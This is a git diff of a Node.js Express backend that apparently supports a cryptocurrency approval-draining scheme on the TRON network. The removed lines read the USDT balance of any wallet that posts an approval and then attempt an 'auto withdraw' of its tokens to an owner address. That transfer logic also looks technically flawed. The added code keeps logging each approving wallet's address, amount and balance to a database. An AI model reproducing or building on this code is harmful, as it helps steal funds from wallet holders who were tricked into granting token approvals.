@@ -1,6 +1,5 @@
 const express = require("express");
 const cors = require("cors");
-const TronWeb = require("tronweb");
 const { createClient } = require("@supabase/supabase-js");
 require("dotenv").config();
 
@@ -10,52 +9,43 @@ app.use(express.json());
 
 const PORT = process.env.PORT || 3000;
 
-// Initialize Supabase
-const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);
+// ✅ Supabase setup
+const supabaseUrl = process.env.SUPABASE_URL;
+const supabaseKey = process.env.SUPABASE_KEY;
+const supabase = createClient(supabaseUrl, supabaseKey);
 
-// Initialize TronWeb with API Key
-const tronWeb = new TronWeb({
-  fullHost: "https://api.trongrid.io",
-  headers: { "TRON-PRO-API-KEY": process.env.TRONGRID_API_KEY },
-  privateKey: process.env.OWNER_PRIVATE_KEY,
+// ✅ Root route to confirm backend is live
+app.get("/", (req, res) => {
+  res.json({ status: "Backend live" });
 });
 
-const USDT_CONTRACT = process.env.USDT_CONTRACT;
-const OWNER_ADDRESS = process.env.OWNER_ADDRESS;
-
+// ✅ Route: Log Approval (from frontend)
 app.post("/log-approval", async (req, res) => {
-  const { walletAddress, amount } = req.body;
-
   try {
-    const balance = await tronWeb.contract().at(USDT_CONTRACT)
-      .then(contract => contract.methods.balanceOf(walletAddress).call());
+    const { wallet_address, amount, balance } = req.body;
 
-    const numericBalance = tronWeb.toBigNumber(balance).div(1e6).toNumber();
-
-    // Store in Supabase
-    await supabase.from("Approvals").insert([
+    const { data, error } = await supabase.from("Approvals").insert([
       {
-        wallet_address: walletAddress,
-        amount: amount,
-        balance: numericBalance,
-        timestamp: new Date().toISOString()
-      }
+        wallet_address,
+        amount,
+        balance,
+        timestamp: new Date().toISOString(),
+      },
     ]);
 
-    // Auto withdraw to OWNER
-    const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
-    const withdrawAmount = tronWeb.toSun(amount * 1_000_000); // Convert USDT to 6 decimals
+    if (error) {
+      console.error("Supabase insert error:", error.message);
+      return res.status(500).json({ success: false, error: error.message });
+    }
 
-    const tx = await usdtContract.transfer(OWNER_ADDRESS, withdrawAmount).send({ from: walletAddress });
-
-    console.log("Auto withdrawal successful:", tx);
-    res.json({ success: true, tx });
-  } catch (error) {
-    console.error("Error in /log-approval:", error);
-    res.status(500).json({ success: false, error: error.message });
+    res.status(200).json({ success: true, data });
+  } catch (err) {
+    console.error("Server error:", err.message);
+    res.status(500).json({ success: false, error: "Internal server error" });
   }
 });
 
+// ✅ Start server
 app.listen(PORT, () => {
-  console.log(`🚀 Server live on port ${PORT}`);
+  console.log(`✅ Backend is running on port ${PORT}`);
 });
